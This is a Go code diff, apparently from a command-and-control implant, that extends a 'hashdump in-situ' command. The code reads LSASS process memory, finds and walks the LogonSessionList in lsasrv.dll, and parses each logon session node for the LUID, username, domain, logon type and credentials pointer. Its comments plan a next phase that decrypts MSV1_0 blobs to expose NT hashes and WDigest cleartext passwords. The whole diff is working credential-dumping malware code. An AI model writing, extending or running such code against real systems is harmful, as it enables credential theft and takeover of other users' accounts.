@@ -3,7 +3,7 @@
 
 package commands
 
-// Phase 2B orchestrator for hashdump in-situ:
+// Phase 2B + 2C-i orchestrator for hashdump in-situ:
 //
 //   1. Run Phase 1 LSA enumeration to get an authoritative LUID → username
 //      map (cross-reference oracle).
@@ -13,15 +13,19 @@ package commands
 //      the LogonSessionList anchor (sigscan + RIP-relative resolution from
 //      Phase 2A).
 //   4. Walk the doubly-linked LogonSessionList in remote memory.
-//   5. For each walked node, scan its raw bytes for any of the Phase 1 LUIDs.
-//      A match validates that the walk landed on real LSAP_LOGON_SESSION_LIST
-//      nodes without depending on Windows-build-specific field offsets.
+//   5. For each walked node, overlay the KIWI_MSV1_0_LIST_63 layout (Phase
+//      2C-i) to extract LUID, UserName, Domain, AuthPackage, LogonType,
+//      LogonServer, and the Credentials list pointer. The structured LUID
+//      is cross-referenced against the Phase 1 LUID set as the primary
+//      validation; a byte-scan fallback (Phase 2B oracle) flags nodes whose
+//      structured LUID is zero so layout drift is visible rather than silent.
 //   6. Emit a structured JSON report (one entry per walked node) plus a
 //      summary header.
 //
-// Phase 2C will replace the LUID byte-scan with structured field parsing for
-// username/domain/AuthPkg, then layer on h3DesKey/hAesKey extraction and
-// MSV1_0 credential-blob decryption.
+// Phase 2C-ii will dereference the Credentials pointer captured here, locate
+// h3DesKey/hAesKey via lsasrv.dll exports, and BCryptDecrypt MSV1_0
+// credential blobs to surface NT hashes (and WDigest cleartext where
+// available).
 
 import (
 	"encoding/hex"
@@ -46,27 +50,39 @@ func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
 	return lsassReadBytes(r.h, addr, size)
 }
 
-// insituFullNodeReport is the JSON-shaped Phase 2B record for a single
-// walked LogonSessionList node.
+// insituFullNodeReport is the JSON-shaped record for a single walked
+// LogonSessionList node, with Phase 2C-i structured fields layered on top
+// of the Phase 2B walk metadata.
 type insituFullNodeReport struct {
-	Address       string         `json:"address"`
-	Flink         string         `json:"flink"`
-	Blink         string         `json:"blink"`
-	MatchedLUIDs  []string       `json:"matched_luids,omitempty"`
-	MatchedUsers  []string       `json:"matched_users,omitempty"`
-	RawPreviewHex string         `json:"raw_preview_hex"`
-	luidMatchSet  map[uint64]int // internal: which Phase 1 LUIDs this node matched
+	Address          string   `json:"address"`
+	Flink            string   `json:"flink"`
+	Blink            string   `json:"blink"`
+	ParsedLUID       string   `json:"parsed_luid,omitempty"`
+	ParsedUserName   string   `json:"parsed_username,omitempty"`
+	ParsedDomain     string   `json:"parsed_domain,omitempty"`
+	ParsedAuthPkg    string   `json:"parsed_auth_package,omitempty"`
+	ParsedLogonType  string   `json:"parsed_logon_type,omitempty"`
+	ParsedLogonSrv   string   `json:"parsed_logon_server,omitempty"`
+	CredentialsPtr   string   `json:"credentials_ptr,omitempty"`
+	Phase1Match      bool     `json:"phase1_luid_match"`
+	Phase1Source     string   `json:"phase1_match_source,omitempty"` // "structured" | "byte-scan-fallback"
+	MatchedUsers     []string `json:"matched_users,omitempty"`
+	ParseErrors      []string `json:"parse_errors,omitempty"`
+	RawPreviewHex    string   `json:"raw_preview_hex"`
 }
 
-// insituFullSummary captures the top-level metadata of a Phase 2B run.
+// insituFullSummary captures the top-level metadata of a hashdump in-situ
+// full run (Phase 2B walk + Phase 2C-i structured parse).
 type insituFullSummary struct {
 	Phase1SessionCount int                    `json:"phase1_session_count"`
 	LSASSPID           uint32                 `json:"lsass_pid"`
 	LsasrvBase         string                 `json:"lsasrv_base"`
 	LsasrvSize         uint32                 `json:"lsasrv_size"`
 	AnchorAddr         string                 `json:"logon_session_list_anchor"`
+	StructLayout       string                 `json:"struct_layout"`
 	NodesWalked        int                    `json:"nodes_walked"`
 	NodesMatched       int                    `json:"nodes_matched_to_phase1"`
+	NodesStructParsed  int                    `json:"nodes_with_structured_luid"`
 	UnmatchedLUIDs     []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
 	Nodes              []insituFullNodeReport `json:"nodes"`
 }
@@ -121,14 +137,21 @@ func executeInsituFull() structs.CommandResult {
 	}
 
 	// Step 5: Walk LogonSessionList. Partial walks are still useful — emit
-	// what was collected even if a tail node fails.
+	// what was collected even if a tail node fails. Read 0x180 bytes/node so
+	// the Phase 2C-i layout (LUID, UserName, Domain, Type, LogonType,
+	// LogonServer, Credentials) is captured in one ReadProcessMemory call.
 	reader := lsassRemoteReader{h: h}
-	nodes, walkErr := walkLogonSessionList(reader, anchor, 0x100, 64)
+	layout := LayoutWin10W8
+	nodes, walkErr := walkLogonSessionList(reader, anchor, layout.NodeReadSize, 64)
 
-	// Step 6: Cross-reference every walked node against Phase 1 LUIDs.
+	// Step 6: For each walked node, overlay the layout to extract structured
+	// fields, then cross-reference the parsed LUID against Phase 1. Fall back
+	// to the Phase 2B byte-scan when the structured parse returns LUID 0
+	// (likely layout drift on a different Windows build).
 	matchedLUIDs := make(map[uint64]bool, len(luidIndex))
 	reports := make([]insituFullNodeReport, 0, len(nodes))
 	matchedNodes := 0
+	structParsed := 0
 	for _, n := range nodes {
 		preview := 32
 		if len(n.Raw) < preview {
@@ -139,21 +162,53 @@ func executeInsituFull() structs.CommandResult {
 			Flink:         fmt.Sprintf("0x%X", n.Flink),
 			Blink:         fmt.Sprintf("0x%X", n.Blink),
 			RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
-			luidMatchSet:  map[uint64]int{},
 		}
-		for _, luid := range luidsOrdered {
-			if !scanRawForLUID(n.Raw, luid) {
-				continue
-			}
-			report.luidMatchSet[luid] = 1
-			matchedLUIDs[luid] = true
-			report.MatchedLUIDs = append(report.MatchedLUIDs, fmt.Sprintf("0x%016X", luid))
-			for _, sess := range luidIndex[luid] {
-				report.MatchedUsers = append(report.MatchedUsers,
-					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+		parsed := parseLogonSessionFields(reader, n.Raw, layout)
+		if parsed.LUID != 0 {
+			structParsed++
+			report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
+		}
+		report.ParsedUserName = parsed.UserName
+		report.ParsedDomain = parsed.Domain
+		report.ParsedAuthPkg = parsed.AuthPackage
+		report.ParsedLogonSrv = parsed.LogonServer
+		if name := logonSessionTypeName(parsed.LogonType); name != "" {
+			report.ParsedLogonType = name
+		}
+		if parsed.CredentialsPtr != 0 {
+			report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
+		}
+		report.ParseErrors = parsed.ParseErrors
+
+		// Primary cross-reference: parsed LUID matches a Phase 1 LUID.
+		if parsed.LUID != 0 {
+			if _, ok := luidIndex[parsed.LUID]; ok {
+				matchedLUIDs[parsed.LUID] = true
+				report.Phase1Match = true
+				report.Phase1Source = "structured"
+				for _, sess := range luidIndex[parsed.LUID] {
+					report.MatchedUsers = append(report.MatchedUsers,
+						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+				}
 			}
 		}
-		if len(report.MatchedLUIDs) > 0 {
+		// Fallback: Phase 2B byte-scan when structured parse missed.
+		if !report.Phase1Match {
+			for _, luid := range luidsOrdered {
+				if !scanRawForLUID(n.Raw, luid) {
+					continue
+				}
+				matchedLUIDs[luid] = true
+				report.Phase1Match = true
+				report.Phase1Source = "byte-scan-fallback"
+				for _, sess := range luidIndex[luid] {
+					report.MatchedUsers = append(report.MatchedUsers,
+						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+				}
+				break
+			}
+		}
+		if report.Phase1Match {
 			matchedNodes++
 		}
 		reports = append(reports, report)
@@ -172,8 +227,10 @@ func executeInsituFull() structs.CommandResult {
 		LsasrvBase:         fmt.Sprintf("0x%X", mod.Base),
 		LsasrvSize:         mod.Size,
 		AnchorAddr:         fmt.Sprintf("0x%X", anchor),
+		StructLayout:       layout.Name,
 		NodesWalked:        len(nodes),
 		NodesMatched:       matchedNodes,
+		NodesStructParsed:  structParsed,
 		UnmatchedLUIDs:     unmatched,
 		Nodes:              reports,
 	}
@@ -192,6 +249,7 @@ func executeInsituFull() structs.CommandResult {
 	} else {
 		sb.WriteString(fmt.Sprintf("[+] Walked %d node(s) cleanly\n", len(nodes)))
 	}
+	sb.WriteString(fmt.Sprintf("[+] Layout: %s — %d/%d node(s) yielded a non-zero structured LUID\n", layout.Name, structParsed, len(nodes)))
 	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n\n", len(matchedLUIDs), len(luidsOrdered)))
 	sb.WriteString(string(jsonBytes))
 	return successResult(sb.String())
